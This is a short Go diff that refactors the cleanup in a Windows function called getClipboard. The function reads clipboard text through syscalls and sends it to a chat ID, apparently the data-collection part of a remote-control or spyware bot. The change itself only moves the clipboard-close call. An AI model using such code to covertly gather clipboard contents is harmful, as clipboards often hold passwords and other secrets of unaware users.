@@ -30,20 +30,19 @@ func getClipboard(chatID int64) {
 	// Open the clipboard
 	ret, _, _ := openClipboard.Call(0)
 	if ret == 0 {
-		goto sendmsg	
+		goto close_and_send	
 	}
-	defer closeClipboard.Call()
 
 	// Get the clipboard data
 	h, _, _ = getClipboardData.Call(uintptr(CF_UNICODETEXT))
 	if h == 0 {
-		goto sendmsg	
+		goto close_and_send	
 	}
 
 	// Lock the handle to get a pointer to the data
 	ptr, _, _ = globalLock.Call(h)
 	if ptr == 0 {
-		goto sendmsg	
+		goto close_and_send	
 	}
 	defer globalUnlock.Call(h)
 
@@ -51,7 +50,6 @@ func getClipboard(chatID int64) {
 	data = (*[1 << 20]uint16)(unsafe.Pointer(ptr))[:]
 
 	// Find the null terminator
-	
 	for i, v := range data {
 		if v == 0 {
 			n = i
@@ -61,7 +59,8 @@ func getClipboard(chatID int64) {
 
 	responseStr = syscall.UTF16ToString(data[:n])
 	
-	sendmsg:
+	close_and_send:
+	closeClipboard.Call()
 	SendMessage(chatID, responseStr)
 
 }
